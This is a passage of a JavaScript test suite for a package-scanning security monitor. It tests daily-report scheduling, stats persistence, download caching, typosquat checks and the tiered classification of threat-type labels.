    const isSuspect = (temporalMaxSev === 'CRITICAL' || temporalMaxSev === 'HIGH');

    assert(isSuspect === true, 'Mixed temporal with any CRITICAL should be SUSPECT');
    assert(temporalMaxSev === 'CRITICAL', 'Should pick CRITICAL as max');
  });

  // --- Daily report date-based dedup (fixed-time 08:00 Paris) ---

  test('MONITOR: loadLastDailyReportDate returns null when file missing', () => {
    let backup = null;
    try { backup = fs.readFileSync(LAST_DAILY_REPORT_FILE, 'utf8'); } catch {}
    try {
      try { fs.unlinkSync(LAST_DAILY_REPORT_FILE); } catch {}
      assert(loadLastDailyReportDate() === null, 'Should return null when file missing');
    } finally {
      if (backup !== null) fs.writeFileSync(LAST_DAILY_REPORT_FILE, backup, 'utf8');
    }
  });

  test('MONITOR: loadLastDailyReportDate returns null for corrupt file', () => {
    let backup = null;
    try { backup = fs.readFileSync(LAST_DAILY_REPORT_FILE, 'utf8'); } catch {}
    try {
      const dir = path.dirname(LAST_DAILY_REPORT_FILE);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(LAST_DAILY_REPORT_FILE, 'not json', 'utf8');
      assert(loadLastDailyReportDate() === null, 'Should return null for corrupt file');
    } finally {
      if (backup !== null) {
        fs.writeFileSync(LAST_DAILY_REPORT_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(LAST_DAILY_REPORT_FILE); } catch {}
      }
    }
  });

  test('MONITOR: saveLastDailyReportDate writes and loadLastDailyReportDate reads', () => {
    let backup = null;
    try { backup = fs.readFileSync(LAST_DAILY_REPORT_FILE, 'utf8'); } catch {}
    try {
      saveLastDailyReportDate('2026-03-01');
      const date = loadLastDailyReportDate();
      assert(date === '2026-03-01', 'Should read back the saved date, got ' + date);
    } finally {
      if (backup !== null) {
        fs.writeFileSync(LAST_DAILY_REPORT_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(LAST_DAILY_REPORT_FILE); } catch {}
      }
    }
  });

  test('MONITOR: hasReportBeenSentToday returns true when disk date is today', () => {
    const origLastDate = stats.lastDailyReportDate;
    let backup = null;
    try { backup = fs.readFileSync(LAST_DAILY_REPORT_FILE, 'utf8'); } catch {}
    try {
      stats.lastDailyReportDate = null; // stale in-memory
      const today = getParisDateString();
      saveLastDailyReportDate(today);
      assert(hasReportBeenSentToday() === true, 'Should return true when disk has today');
    } finally {
      stats.lastDailyReportDate = origLastDate;
      if (backup !== null) {
        fs.writeFileSync(LAST_DAILY_REPORT_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(LAST_DAILY_REPORT_FILE); } catch {}
      }
    }
  });

  test('MONITOR: hasReportBeenSentToday returns true when in-memory date is today', () => {
    const origLastDate = stats.lastDailyReportDate;
    try {
      stats.lastDailyReportDate = getParisDateString();
      assert(hasReportBeenSentToday() === true, 'Should return true when in-memory has today');
    } finally {
      stats.lastDailyReportDate = origLastDate;
    }
  });

  test('MONITOR: hasReportBeenSentToday returns false when date is yesterday', () => {
    const origLastDate = stats.lastDailyReportDate;
    let backup = null;
    try { backup = fs.readFileSync(LAST_DAILY_REPORT_FILE, 'utf8'); } catch {}
    try {
      stats.lastDailyReportDate = '1970-01-01';
      saveLastDailyReportDate('1970-01-01');
      assert(hasReportBeenSentToday() === false, 'Should return false for old date');
    } finally {
      stats.lastDailyReportDate = origLastDate;
      if (backup !== null) {
        fs.writeFileSync(LAST_DAILY_REPORT_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(LAST_DAILY_REPORT_FILE); } catch {}
      }
    }
  });

  test('MONITOR: hasReportBeenSentToday returns false when no file and no in-memory date', () => {
    const origLastDate = stats.lastDailyReportDate;
    let backup = null;
    try { backup = fs.readFileSync(LAST_DAILY_REPORT_FILE, 'utf8'); } catch {}
    try {
      stats.lastDailyReportDate = null;
      try { fs.unlinkSync(LAST_DAILY_REPORT_FILE); } catch {}
      assert(hasReportBeenSentToday() === false, 'Should return false when nothing stored');
    } finally {
      stats.lastDailyReportDate = origLastDate;
      if (backup !== null) fs.writeFileSync(LAST_DAILY_REPORT_FILE, backup, 'utf8');
    }
  });

  test('MONITOR: isDailyReportDue returns false when report already sent today', () => {
    const origLastDate = stats.lastDailyReportDate;
    try {
      stats.lastDailyReportDate = getParisDateString();
      // Regardless of hour, already sent today → false
      assert(isDailyReportDue() === false, 'Should not be due if already sent today');
    } finally {
      stats.lastDailyReportDate = origLastDate;
    }
  });

  // --- Popularity pre-filter tests ---

  test('MONITOR: POPULAR_THRESHOLD is 50000', () => {
    assert(POPULAR_THRESHOLD === 50000, 'POPULAR_THRESHOLD should be 50000, got ' + POPULAR_THRESHOLD);
  });

  test('MONITOR: downloadsCache stores and returns cached value', () => {
    downloadsCache.clear();
    downloadsCache.set('test-pkg', { downloads: 100000, fetchedAt: Date.now() });
    const cached = downloadsCache.get('test-pkg');
    assert(cached.downloads === 100000, 'Cached downloads should be 100000');
    downloadsCache.clear();
  });

  test('MONITOR: downloadsCache entry expires after TTL', () => {
    downloadsCache.clear();
    const expiredTime = Date.now() - DOWNLOADS_CACHE_TTL - 1000;
    downloadsCache.set('expired-pkg', { downloads: 200000, fetchedAt: expiredTime });
    const cached = downloadsCache.get('expired-pkg');
    assert(cached !== undefined, 'Entry should exist in map');
    assert((Date.now() - cached.fetchedAt) >= DOWNLOADS_CACHE_TTL, 'Entry should be past TTL');
    downloadsCache.clear();
  });

  test('MONITOR: hasTyposquat detects typosquat_detected', () => {
    const result = { threats: [{ type: 'typosquat_detected', severity: 'HIGH' }] };
    assert(hasTyposquat(result) === true, 'Should detect typosquat_detected');
  });

  test('MONITOR: hasTyposquat detects pypi_typosquat_detected', () => {
    const result = { threats: [{ type: 'pypi_typosquat_detected', severity: 'HIGH' }] };
    assert(hasTyposquat(result) === true, 'Should detect pypi_typosquat_detected');
  });

  test('MONITOR: hasTyposquat returns false for normal threats', () => {
    const result = { threats: [{ type: 'obfuscation_detected', severity: 'MEDIUM' }] };
    assert(hasTyposquat(result) === false, 'Should return false for non-typosquat threats');
  });

  test('MONITOR: hasTyposquat returns false for null/empty', () => {
    assert(hasTyposquat(null) === false, 'Should return false for null');
    assert(hasTyposquat({}) === false, 'Should return false for empty object');
    assert(hasTyposquat({ threats: [] }) === false, 'Should return false for empty threats');
  });

  test('MONITOR: formatFindings formats and deduplicates', () => {
    const result = {
      threats: [
        { type: 'obfuscation_detected', severity: 'CRITICAL' },
        { type: 'obfuscation_detected', severity: 'CRITICAL' },
        { type: 'credential_tampering', severity: 'CRITICAL' },
        { type: 'dynamic_require', severity: 'HIGH' }
      ]
    };
    const formatted = formatFindings(result);
    assert(formatted === 'obfuscation_detected(CRITICAL), credential_tampering(CRITICAL), dynamic_require(HIGH)',
      'Should deduplicate and format, got: ' + formatted);
  });

  test('MONITOR: formatFindings returns empty for no threats', () => {
    assert(formatFindings(null) === '', 'Should return empty for null');
    assert(formatFindings({}) === '', 'Should return empty for no threats');
    assert(formatFindings({ threats: [] }) === '', 'Should return empty for empty threats');
  });

  test('MONITOR: popular package without IOC/typosquat/HIGH would be TRUSTED (logic test)', () => {
    // Test the logic conditions for pre-filter eligibility
    const result = {
      threats: [{ type: 'obfuscation_detected', severity: 'MEDIUM' }],
      summary: { critical: 0, high: 0, medium: 1, low: 0, total: 1 }
    };
    const ecosystem = 'npm';
    const eligible = ecosystem === 'npm'
      && !hasIOCMatch(result)
      && !hasTyposquat(result)
      && !hasHighOrCritical(result);
    assert(eligible === true, 'Package with only MEDIUM findings and no IOC/typosquat should be eligible');
  });

  test('MONITOR: popular package WITH IOC is not skipped', () => {
    const result = {
      threats: [{ type: 'known_malicious_package', severity: 'CRITICAL' }],
      summary: { critical: 1, high: 0, medium: 0, low: 0, total: 1 }
    };
    const eligible = !hasIOCMatch(result) && !hasTyposquat(result) && !hasHighOrCritical(result);
    assert(eligible === false, 'Package with IOC match should NOT be eligible for pre-filter');
  });

  test('MONITOR: popular package WITH HIGH findings is not skipped', () => {
    const result = {
      threats: [{ type: 'suspicious_dataflow', severity: 'HIGH' }],
      summary: { critical: 0, high: 1, medium: 0, low: 0, total: 1 }
    };
    const eligible = !hasIOCMatch(result) && !hasTyposquat(result) && !hasHighOrCritical(result);
    assert(eligible === false, 'Package with HIGH findings should NOT be eligible for pre-filter');
  });

  await asyncTest('MONITOR: sendDailyReport clears downloadsCache', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    const origLog = console.log;
    const origErr = console.error;
    console.log = () => {};
    console.error = () => {};

    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';

    const webhookModule = require('../../src/webhook.js');
    const origSendWebhook = webhookModule.sendWebhook;
    webhookModule.sendWebhook = async () => {};

    const origScanned = stats.scanned;
    const origClean = stats.clean;
    const origSuspect = stats.suspect;
    const origErrors = stats.errors;
    const origTotalTimeMs = stats.totalTimeMs;
    const origLastDate = stats.lastDailyReportDate;

    stats.scanned = 1;
    stats.clean = 1;
    stats.suspect = 0;
    stats.errors = 0;
    stats.totalTimeMs = 1000;
    downloadsCache.set('cached-pkg', { downloads: 999999, fetchedAt: Date.now() });

    try {
      await sendDailyReport();
      assert(downloadsCache.size === 0, 'downloadsCache should be cleared after sendDailyReport, got size ' + downloadsCache.size);
    } finally {
      webhookModule.sendWebhook = origSendWebhook;
      console.log = origLog;
      console.error = origErr;
      stats.scanned = origScanned;
      stats.clean = origClean;
      stats.suspect = origSuspect;
      stats.errors = origErrors;
      stats.totalTimeMs = origTotalTimeMs;
      dailyAlerts.length = 0;
      recentlyScanned.clear();
      downloadsCache.clear();
      stats.lastDailyReportDate = origLastDate;
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  // --- Daily report cooldown bug fixes ---

  await asyncTest('MONITOR: sendDailyReport skips when 0 packages scanned', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    const origLog = console.log;
    const origErr = console.error;
    const logs = [];
    console.log = (...args) => logs.push(args.join(' '));
    console.error = () => {};

    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';

    const webhookModule = require('../../src/webhook.js');
    const origSendWebhook = webhookModule.sendWebhook;
    let webhookCalled = false;
    webhookModule.sendWebhook = async () => { webhookCalled = true; };

    const origScanned = stats.scanned;
    const origClean = stats.clean;
    const origSuspect = stats.suspect;
    const origErrors = stats.errors;

    stats.scanned = 0;
    stats.clean = 0;
    stats.suspect = 0;
    stats.errors = 0;

    try {
      await sendDailyReport();
      assert(webhookCalled === false, 'Webhook should NOT be called when 0 packages scanned');
      const skipLog = logs.find(l => l.includes('skipped (0 packages scanned)'));
      assert(skipLog !== undefined, 'Should log that report was skipped due to 0 scanned');
    } finally {
      webhookModule.sendWebhook = origSendWebhook;
      console.log = origLog;
      console.error = origErr;
      stats.scanned = origScanned;
      stats.clean = origClean;
      stats.suspect = origSuspect;
      stats.errors = origErrors;
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  await asyncTest('MONITOR: sendDailyReport saves date to disk even when webhook fails', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    const origLog = console.log;
    const origErr = console.error;
    console.log = () => {};
    console.error = () => {};

    // Point to a URL that will fail (no real webhook)
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';

    const origScanned = stats.scanned;
    const origLastDate = stats.lastDailyReportDate;
    stats.scanned = 1;

    let backupFile = null;
    try {
      backupFile = fs.readFileSync(LAST_DAILY_REPORT_FILE, 'utf8');
    } catch {}

    try {
      try { fs.unlinkSync(LAST_DAILY_REPORT_FILE); } catch {}
      await sendDailyReport();
      // Even though webhook failed, date should be saved (write-ahead)
      const savedDate = loadLastDailyReportDate();
      const today = getParisDateString();
      assert(savedDate === today, 'Date should be saved to disk even on webhook failure, got ' + savedDate);
      assert(hasReportBeenSentToday() === true, 'Should mark today as sent');
    } finally {
      console.log = origLog;
      console.error = origErr;
      stats.scanned = origScanned;
      stats.lastDailyReportDate = origLastDate;
      dailyAlerts.length = 0;
      recentlyScanned.clear();
      downloadsCache.clear();
      if (backupFile !== null) {
        fs.writeFileSync(LAST_DAILY_REPORT_FILE, backupFile, 'utf8');
      }
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: isDailyReportDue returns false when disk has today even if in-memory stale', () => {
    const origLastDate = stats.lastDailyReportDate;
    let backupFile = null;
    try { backupFile = fs.readFileSync(LAST_DAILY_REPORT_FILE, 'utf8'); } catch {}

    try {
      stats.lastDailyReportDate = '1970-01-01'; // Stale in-memory
      saveLastDailyReportDate(getParisDateString()); // Fresh on disk
      // isDailyReportDue checks hasReportBeenSentToday which reads disk
      // Regardless of hour, today's report is already sent → false
      assert(hasReportBeenSentToday() === true, 'hasReportBeenSentToday should check disk');
    } finally {
      stats.lastDailyReportDate = origLastDate;
      if (backupFile !== null) {
        fs.writeFileSync(LAST_DAILY_REPORT_FILE, backupFile, 'utf8');
      } else {
        try { fs.unlinkSync(LAST_DAILY_REPORT_FILE); } catch {}
      }
    }
  });

  // --- Daily stats persistence tests ---

  test('MONITOR: DAILY_STATS_PERSIST_INTERVAL is 10', () => {
    assert(DAILY_STATS_PERSIST_INTERVAL === 10, 'Should persist every 10 scans, got ' + DAILY_STATS_PERSIST_INTERVAL);
  });

  test('MONITOR: saveDailyStats and loadDailyStats roundtrip', () => {
    const origScanned = stats.scanned;
    const origClean = stats.clean;
    const origSuspect = stats.suspect;
    const origErrors = stats.errors;
    const origTotalTimeMs = stats.totalTimeMs;
    const origDailyAlerts = dailyAlerts.slice();

    let backup = null;
    try { backup = fs.readFileSync(DAILY_STATS_FILE, 'utf8'); } catch {}

    try {
      stats.scanned = 42;
      stats.clean = 30;
      stats.suspect = 10;
      stats.errors = 2;
      stats.totalTimeMs = 99000;
      dailyAlerts.length = 0;
      dailyAlerts.push({ name: 'test-pkg', version: '1.0.0', ecosystem: 'npm', findingsCount: 3 });

      saveDailyStats();

      // Reset to zero
      stats.scanned = 0;
      stats.clean = 0;
      stats.suspect = 0;
      stats.errors = 0;
      stats.totalTimeMs = 0;
      dailyAlerts.length = 0;

      loadDailyStats();

      assert(stats.scanned === 42, 'scanned should be restored to 42, got ' + stats.scanned);
      assert(stats.clean === 30, 'clean should be restored to 30, got ' + stats.clean);
      assert(stats.suspect === 10, 'suspect should be restored to 10, got ' + stats.suspect);
      assert(stats.errors === 2, 'errors should be restored to 2, got ' + stats.errors);
      assert(stats.totalTimeMs === 99000, 'totalTimeMs should be restored');
      assert(dailyAlerts.length === 1, 'dailyAlerts should be restored, got ' + dailyAlerts.length);
      assert(dailyAlerts[0].name === 'test-pkg', 'dailyAlert name should match');
    } finally {
      stats.scanned = origScanned;
      stats.clean = origClean;
      stats.suspect = origSuspect;
      stats.errors = origErrors;
      stats.totalTimeMs = origTotalTimeMs;
      dailyAlerts.length = 0;
      dailyAlerts.push(...origDailyAlerts);
      if (backup !== null) {
        fs.writeFileSync(DAILY_STATS_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(DAILY_STATS_FILE); } catch {}
      }
    }
  });

  test('MONITOR: loadDailyStats starts from zero when file missing', () => {
    const origScanned = stats.scanned;
    let backup = null;
    try { backup = fs.readFileSync(DAILY_STATS_FILE, 'utf8'); } catch {}

    try {
      try { fs.unlinkSync(DAILY_STATS_FILE); } catch {}
      stats.scanned = 99;
      loadDailyStats();
      // File missing → no restoration, stats stay as-is
      assert(stats.scanned === 99, 'Should not change stats when file missing');
    } finally {
      stats.scanned = origScanned;
      if (backup !== null) fs.writeFileSync(DAILY_STATS_FILE, backup, 'utf8');
    }
  });

  test('MONITOR: loadDailyStats handles corrupt file', () => {
    const origScanned = stats.scanned;
    let backup = null;
    try { backup = fs.readFileSync(DAILY_STATS_FILE, 'utf8'); } catch {}

    try {
      const dir = path.dirname(DAILY_STATS_FILE);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(DAILY_STATS_FILE, 'not json', 'utf8');
      stats.scanned = 99;
      loadDailyStats();
      assert(stats.scanned === 99, 'Should not change stats for corrupt file');
    } finally {
      stats.scanned = origScanned;
      if (backup !== null) {
        fs.writeFileSync(DAILY_STATS_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(DAILY_STATS_FILE); } catch {}
      }
    }
  });

  test('MONITOR: resetDailyStats removes the file', () => {
    let backup = null;
    try { backup = fs.readFileSync(DAILY_STATS_FILE, 'utf8'); } catch {}

    try {
      const dir = path.dirname(DAILY_STATS_FILE);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(DAILY_STATS_FILE, '{}', 'utf8');
      assert(fs.existsSync(DAILY_STATS_FILE) === true, 'File should exist before reset');
      resetDailyStats();
      assert(fs.existsSync(DAILY_STATS_FILE) === false, 'File should be deleted after reset');
    } finally {
      if (backup !== null) fs.writeFileSync(DAILY_STATS_FILE, backup, 'utf8');
    }
  });

  test('MONITOR: maybePersistDailyStats throttles at DAILY_STATS_PERSIST_INTERVAL', () => {
    const origScanned = stats.scanned;
    const origSinceLastPersist = require('../../src/monitor.js').scansSinceLastPersist;
    let backup = null;
    try { backup = fs.readFileSync(DAILY_STATS_FILE, 'utf8'); } catch {}

    const monitor = require('../../src/monitor.js');

    try {
      try { fs.unlinkSync(DAILY_STATS_FILE); } catch {}
      monitor.scansSinceLastPersist = 0;
      stats.scanned = 7;

      // Call 9 times — should NOT persist yet
      for (let i = 0; i < DAILY_STATS_PERSIST_INTERVAL - 1; i++) {
        maybePersistDailyStats();
      }
      assert(!fs.existsSync(DAILY_STATS_FILE), 'Should NOT persist before interval reached');

      // 10th call — should persist
      maybePersistDailyStats();
      assert(fs.existsSync(DAILY_STATS_FILE), 'Should persist at interval');

      const data = JSON.parse(fs.readFileSync(DAILY_STATS_FILE, 'utf8'));
      assert(data.scanned === 7, 'Persisted scanned should be 7, got ' + data.scanned);
    } finally {
      stats.scanned = origScanned;
      monitor.scansSinceLastPersist = 0;
      if (backup !== null) {
        fs.writeFileSync(DAILY_STATS_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(DAILY_STATS_FILE); } catch {}
      }
    }
  });

  await asyncTest('MONITOR: sendDailyReport resets daily stats file', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    const origLog = console.log;
    const origErr = console.error;
    console.log = () => {};
    console.error = () => {};

    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';

    const origScanned = stats.scanned;
    const origClean = stats.clean;
    const origSuspect = stats.suspect;
    const origErrors = stats.errors;
    const origTotalTimeMs = stats.totalTimeMs;
    const origLastDate = stats.lastDailyReportDate;

    let backupStats = null;
    try { backupStats = fs.readFileSync(DAILY_STATS_FILE, 'utf8'); } catch {}
    let backupReport = null;
    try { backupReport = fs.readFileSync(LAST_DAILY_REPORT_FILE, 'utf8'); } catch {}

    stats.scanned = 5;
    stats.clean = 3;
    stats.suspect = 2;
    stats.errors = 0;
    stats.totalTimeMs = 10000;

    // Write daily stats file
    saveDailyStats();
    assert(fs.existsSync(DAILY_STATS_FILE), 'daily-stats.json should exist before sendDailyReport');

    try {
      await sendDailyReport();
      assert(!fs.existsSync(DAILY_STATS_FILE), 'daily-stats.json should be deleted after sendDailyReport');
    } finally {
      console.log = origLog;
      console.error = origErr;
      stats.scanned = origScanned;
      stats.clean = origClean;
      stats.suspect = origSuspect;
      stats.errors = origErrors;
      stats.totalTimeMs = origTotalTimeMs;
      stats.lastDailyReportDate = origLastDate;
      dailyAlerts.length = 0;
      recentlyScanned.clear();
      downloadsCache.clear();
      if (backupStats !== null) {
        fs.writeFileSync(DAILY_STATS_FILE, backupStats, 'utf8');
      } else {
        try { fs.unlinkSync(DAILY_STATS_FILE); } catch {}
      }
      if (backupReport !== null) {
        fs.writeFileSync(LAST_DAILY_REPORT_FILE, backupReport, 'utf8');
      }
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });
  // ============================================
  // isSuspectClassification TIER TESTS
  // ============================================

  console.log('\n=== isSuspectClassification TIER TESTS ===\n');

  // --- Null/empty → not suspect ---

  test('isSuspectClassification: null/empty → { suspect: false, tier: null }', () => {
    let r = isSuspectClassification(null);
    assert(r.suspect === false && r.tier === null, 'null should be not suspect');
    r = isSuspectClassification({});
    assert(r.suspect === false && r.tier === null, 'empty object should be not suspect');
    r = isSuspectClassification({ threats: [] });
    assert(r.suspect === false && r.tier === null, 'empty threats should be not suspect');
    r = isSuspectClassification({ threats: [], summary: { critical: 0, high: 0, medium: 0, low: 0 } });
    assert(r.suspect === false && r.tier === null, 'empty threats with summary should be not suspect');
  });

  // --- Single finding, 1 type → not suspect (distinctTypes < 2, no HIGH/CRIT) ---

  test('isSuspectClassification: 1 LOW finding → not suspect', () => {
    const result = { threats: [{ type: 'dynamic_require', severity: 'LOW' }], summary: { critical: 0, high: 0, medium: 0, low: 1 } };
    const r = isSuspectClassification(result);
    assert(r.suspect === false && r.tier === null, 'Single LOW should be not suspect');
  });

  test('isSuspectClassification: 1 MEDIUM finding → not suspect', () => {
    const result = { threats: [{ type: 'obfuscation_detected', severity: 'MEDIUM' }], summary: { critical: 0, high: 0, medium: 1, low: 0 } };
    const r = isSuspectClassification(result);
    assert(r.suspect === false && r.tier === null, 'Single MEDIUM should be not suspect');
  });

  test('isSuspectClassification: 2 findings same type MEDIUM → not suspect', () => {
    const result = {
      threats: [
        { type: 'obfuscation_detected', severity: 'MEDIUM' },
        { type: 'obfuscation_detected', severity: 'MEDIUM' }
      ],
      summary: { critical: 0, high: 0, medium: 2, low: 0 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === false && r.tier === null, '2 same-type MEDIUM should be not suspect');
  });

  // --- Tier 1: HIGH, CRITICAL, lifecycle, high-intent types ---

  test('isSuspectClassification T1: 1 HIGH finding → tier 1', () => {
    const result = { threats: [{ type: 'suspicious_dataflow', severity: 'HIGH' }], summary: { critical: 0, high: 1, medium: 0, low: 0 } };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 1, 'Single HIGH should be T1, got tier=' + r.tier);
  });

  test('isSuspectClassification T1: 1 CRITICAL finding → tier 1', () => {
    const result = { threats: [{ type: 'known_malicious_package', severity: 'CRITICAL' }], summary: { critical: 1, high: 0, medium: 0, low: 0 } };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 1, 'Single CRITICAL should be T1, got tier=' + r.tier);
  });

  test('isSuspectClassification T1: lifecycle_script (MEDIUM) → tier 1', () => {
    const result = {
      threats: [{ type: 'lifecycle_script', severity: 'MEDIUM' }],
      summary: { critical: 0, high: 0, medium: 1, low: 0 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 1, 'lifecycle_script should be T1, got tier=' + r.tier);
  });

  test('isSuspectClassification T1: sandbox_evasion type → tier 1', () => {
    const result = {
      threats: [{ type: 'sandbox_evasion', severity: 'MEDIUM' }],
      summary: { critical: 0, high: 0, medium: 1, low: 0 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 1, 'sandbox_evasion should be T1, got tier=' + r.tier);
  });

  test('isSuspectClassification T1: env_charcode_reconstruction → tier 1', () => {
    const result = {
      threats: [{ type: 'env_charcode_reconstruction', severity: 'MEDIUM' }],
      summary: { critical: 0, high: 0, medium: 1, low: 0 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 1, 'env_charcode_reconstruction should be T1, got tier=' + r.tier);
  });

  test('isSuspectClassification T1: staged_payload → tier 1', () => {
    const result = {
      threats: [{ type: 'staged_payload', severity: 'MEDIUM' }],
      summary: { critical: 0, high: 0, medium: 1, low: 0 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 1, 'staged_payload should be T1, got tier=' + r.tier);
  });

  test('isSuspectClassification T1: staged_binary_payload → tier 1', () => {
    const result = {
      threats: [{ type: 'staged_binary_payload', severity: 'MEDIUM' }],
      summary: { critical: 0, high: 0, medium: 1, low: 0 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 1, 'staged_binary_payload should be T1, got tier=' + r.tier);
  });

  // --- Tier 2: 2+ distinct types with active signal ---

  test('isSuspectClassification T2: suspicious_dataflow + obfuscation → tier 2', () => {
    const result = {
      threats: [
        { type: 'suspicious_dataflow', severity: 'LOW' },
        { type: 'obfuscation_detected', severity: 'LOW' }
      ],
      summary: { critical: 0, high: 0, medium: 0, low: 2 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 2, 'dataflow + obfuscation should be T2, got tier=' + r.tier);
  });

  test('isSuspectClassification T2: dangerous_call_eval + sensitive_string → tier 2', () => {
    const result = {
      threats: [
        { type: 'dangerous_call_eval', severity: 'MEDIUM' },
        { type: 'sensitive_string', severity: 'LOW' }
      ],
      summary: { critical: 0, high: 0, medium: 1, low: 1 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 2, 'eval + sensitive_string should be T2, got tier=' + r.tier);
  });

  test('isSuspectClassification T1: mcp_config_injection + dynamic_require → tier 1', () => {
    const result = {
      threats: [
        { type: 'mcp_config_injection', severity: 'MEDIUM' },
        { type: 'dynamic_require', severity: 'LOW' }
      ],
      summary: { critical: 0, high: 0, medium: 1, low: 1 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 1, 'mcp_config_injection should be T1, got tier=' + r.tier);
  });

  test('isSuspectClassification T2: non-passive non-active types → tier 2 (fallback)', () => {
    const result = {
      threats: [
        { type: 'credential_tampering', severity: 'MEDIUM' },
        { type: 'require_cache_poison', severity: 'MEDIUM' }
      ],
      summary: { critical: 0, high: 0, medium: 2, low: 0 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 2, 'non-passive non-active 2+ types should be T2, got tier=' + r.tier);
  });

  // --- Tier 3: passive-only types ---

  test('isSuspectClassification T3: sensitive_string + obfuscation_detected → tier 3', () => {
    const result = {
      threats: [
        { type: 'sensitive_string', severity: 'MEDIUM' },
        { type: 'obfuscation_detected', severity: 'MEDIUM' }
      ],
      summary: { critical: 0, high: 0, medium: 2, low: 0 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 3, 'passive-only should be T3, got tier=' + r.tier);
  });

  test('isSuspectClassification T3: dynamic_require + prototype_hook → tier 3', () => {
    const result = {
      threats: [
        { type: 'dynamic_require', severity: 'LOW' },
        { type: 'prototype_hook', severity: 'LOW' }
      ],
      summary: { critical: 0, high: 0, medium: 0, low: 2 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 3, 'dynamic_require + prototype_hook should be T3, got tier=' + r.tier);
  });

  test('isSuspectClassification T3: env_access + high_entropy_string + dynamic_import → tier 3', () => {
    const result = {
      threats: [
        { type: 'env_access', severity: 'LOW' },
        { type: 'high_entropy_string', severity: 'MEDIUM' },
        { type: 'dynamic_import', severity: 'LOW' }
      ],
      summary: { critical: 0, high: 0, medium: 1, low: 2 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 3, 'all passive types should be T3, got tier=' + r.tier);
  });

  test('isSuspectClassification T3: suspicious_domain + sensitive_string → tier 3', () => {
    const result = {
      threats: [
        { type: 'suspicious_domain', severity: 'MEDIUM' },
        { type: 'sensitive_string', severity: 'LOW' }
      ],
      summary: { critical: 0, high: 0, medium: 1, low: 1 }
    };
    const r = isSuspectClassification(result);
    assert(r.suspect === true && r.tier === 3, 'suspicious_domain + sensitive_string should be T3, got tier=' + r.tier);
  });

  // --- Tier constants sanity checks ---

  test('isSuspectClassification: TIER1_TYPES contains expected types', () => {
    assert(TIER1_TYPES.has('sandbox_evasion'), 'sandbox_evasion in TIER1');
    assert(TIER1_TYPES.has('env_charcode_reconstruction'), 'env_charcode_reconstruction in TIER1');
    assert(TIER1_TYPES.has('staged_payload'), 'staged_payload in TIER1');
    assert(TIER1_TYPES.has('staged_binary_payload'), 'staged_binary_payload in TIER1');
    assert(TIER1_TYPES.has('mcp_config_injection'), 'mcp_config_injection in TIER1');
    assert(TIER1_TYPES.has('ai_agent_abuse'), 'ai_agent_abuse in TIER1');
    assert(TIER1_TYPES.has('crypto_miner'), 'crypto_miner in TIER1');
    assert(TIER1_TYPES.size === 7, 'TIER1 should have 7 types, got ' + TIER1_TYPES.size);
  });

  test('isSuspectClassification: TIER2_ACTIVE_TYPES contains expected types', () => {
    assert(TIER2_ACTIVE_TYPES.has('suspicious_dataflow'), 'suspicious_dataflow in TIER2');
    assert(TIER2_ACTIVE_TYPES.has('dangerous_call_eval'), 'dangerous_call_eval in TIER2');
    assert(TIER2_ACTIVE_TYPES.has('dangerous_call_function'), 'dangerous_call_function in TIER2');
    assert(TIER2_ACTIVE_TYPES.size === 3, 'TIER2 should have 3 types, got ' + TIER2_ACTIVE_TYPES.size);
  });

  test('isSuspectClassification: TIER3_PASSIVE_TYPES contains expected types', () => {
    assert(TIER3_PASSIVE_TYPES.has('sensitive_string'), 'sensitive_string in TIER3');
    assert(TIER3_PASSIVE_TYPES.has('suspicious_domain'), 'suspicious_domain in TIER3');
    assert(TIER3_PASSIVE_TYPES.has('obfuscation_detected'), 'obfuscation_detected in TIER3');
    assert(TIER3_PASSIVE_TYPES.has('prototype_hook'), 'prototype_hook in TIER3');
    assert(TIER3_PASSIVE_TYPES.has('env_access'), 'env_access in TIER3');
